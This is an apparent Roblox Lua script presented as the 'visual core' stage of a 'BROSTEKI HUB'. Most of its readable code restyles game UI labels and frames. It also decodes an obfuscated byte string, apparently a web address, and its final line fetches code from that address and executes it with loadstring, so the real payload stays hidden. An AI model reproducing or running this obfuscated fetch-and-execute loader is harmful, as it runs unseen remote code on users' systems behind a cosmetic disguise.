
--[[ STAGE 2: VISUAL CORE ]]
local EoNEUbIFIciUi2mOiXkc="\100\030\023\083\092\106\023\089\018\077\074\073\030\006\006\055\048\052\030\000\008\057\048\059\060\063\037\006\062\214\214\213\208\043\220\055\046\050\036\048\214\193\206\218\200\042\012\200\243\254\032\048\241\242\200\250\038\249\231\254\150\224\230\238\149\227\210\237\154\159\232\154\144\134\144\131\142\143\202\138\182\128\245\189\177\182\167\187\166\176\161\186\170\086\185\082\175\081\168\168\145\068\168\071\134\132\137\076\079\073\119\065"local ChsMgmjgo8UO_K=214 local zjrho8vnzcBU=53 local Z1Qi04XMCvJ7iGitEDsz=1 local SWM7XuvyiWqvIIIU7kh9f=2 local o3pQpE3FhtCHT=26 local sDhNvRZQsuegJ69Jqcfy=true local oV9OeHOZ0Di5Yxm4mtNjd=bit32 and bit32.bxor if not oV9OeHOZ0Di5Yxm4mtNjd then oV9OeHOZ0Di5Yxm4mtNjd=function(a,b)local r,m=0,1 while a>0 or b>0 do local aa=a%2 local bb=b%2 if aa~=bb then r=r+m end a=(a-aa)/2 b=(b-bb)/2 m=m*2 end return r end end local clXQbGBl4ciQNy={}for UgY9aWtOYiOj0UtGrQhBp=1,#EoNEUbIFIciUi2mOiXkc do local UBNn0khvQSMZgEqEKoHsk7=string.byte(EoNEUbIFIciUi2mOiXkc,UgY9aWtOYiOj0UtGrQhBp)local IQ6JczTu5k9yKBbIduQ=(zjrho8vnzcBU+(UgY9aWtOYiOj0UtGrQhBp*SWM7XuvyiWqvIIIU7kh9f)+o3pQpE3FhtCHT)%256 if Z1Qi04XMCvJ7iGitEDsz==0 then UBNn0khvQSMZgEqEKoHsk7=(UBNn0khvQSMZgEqEKoHsk7-IQ6JczTu5k9yKBbIduQ)%256 clXQbGBl4ciQNy[UgY9aWtOYiOj0UtGrQhBp]=string.char(oV9OeHOZ0Di5Yxm4mtNjd(UBNn0khvQSMZgEqEKoHsk7,ChsMgmjgo8UO_K))else UBNn0khvQSMZgEqEKoHsk7=oV9OeHOZ0Di5Yxm4mtNjd(UBNn0khvQSMZgEqEKoHsk7,ChsMgmjgo8UO_K)clXQbGBl4ciQNy[UgY9aWtOYiOj0UtGrQhBp]=string.char((UBNn0khvQSMZgEqEKoHsk7-IQ6JczTu5k9yKBbIduQ)%256)end end local Yq_CDEFZ8wo2EGSsoC=table.concat(clXQbGBl4ciQNy)if sDhNvRZQsuegJ69Jqcfy then Yq_CDEFZ8wo2EGSsoC=string.reverse(Yq_CDEFZ8wo2EGSsoC)end local BrlJ7VT5cCB5zY21FX=Yq_CDEFZ8wo2EGSsoC
local HubName = "BROSTEKI HUB"
local Acc = Color3.fromRGB(0, 255, 120)

-- // SMART HOOK //
local function Hook()
    local function Customize(obj)
        pcall(function()
            if obj:IsA("TextLabel") then
                if obj.TextSize >= 18 or obj.Name:find("Title") or obj.Name:find("Header") then
                    if #obj.Text > 3 and not tonumber(obj.Text) then
                        obj.Text = HubName
                        obj.TextColor3 = Acc
                    end
                end
            end
            if obj:IsA("Frame") or obj:IsA("TextButton") then
                if obj.BackgroundColor3.R < 0.2 then
                    if not obj:FindFirstChild("UICorner") then
                        local uic = Instance.new("UICorner")
                        uic.CornerRadius = UDim.new(0, 6)
                        uic.Parent = obj
                    end
                end
            end
        end)
    end

    game.DescendantAdded:Connect(function(c)
        if c:IsA("GuiObject") then
            task.delay(0.1, function() Customize(c) end)
        end
    end)
end

Hook()
loadstring(game:HttpGet(BrlJ7VT5cCB5zY21FX))()
